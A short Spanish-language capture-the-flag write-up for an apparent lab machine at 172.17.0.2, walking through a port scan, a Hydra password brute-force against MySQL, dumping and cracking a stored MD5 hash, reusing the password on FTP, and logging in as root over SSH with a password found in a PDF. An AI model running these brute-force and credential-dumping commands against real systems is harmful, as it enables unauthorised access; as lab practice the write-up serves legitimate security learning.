## Reconocimiento:

Puerto 21 : FTP

Puerto 22 : SSH

Puerto 80 : HTTP

Puerto 3306 : MySQL

En la web no hay mucho solo un user : capybara.

Viendo los demás servicios puede ser un usuario de cualquiera de los 3. Así que pruebo fuzzing con Hydra a los tres. Obtengo resultado con MySQL:

```bash
hydra -l capybara -P <WORDLIST> mysql://172.17.0.2 -t 64 -I
```

Pass : password1

Entro:

```bash
mysql -h 172.17.0.2 -u capybara -ppassword1 --ssl=0
show databases;
use beta;
show tables;
select * from registraton;
```

Obtengo la siguiente info:

```
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | balulero | 520d3142a140addb8be7d858a7e29e15 |
+----+----------+----------------------------------+
```

Es un hash, asI que intento crackero y lo consigo:

```
password1
```

Pruebo esa contraseña en ftp y funciona. 

Hay un archivo PDF, lo paso a mi maquina y veo que es la contraseña distorsionada de root para ssh:

```
passwordpepinaca
```

Y entramos directamente:

```bash
ssh root@172.17.0.2
```

Listo.
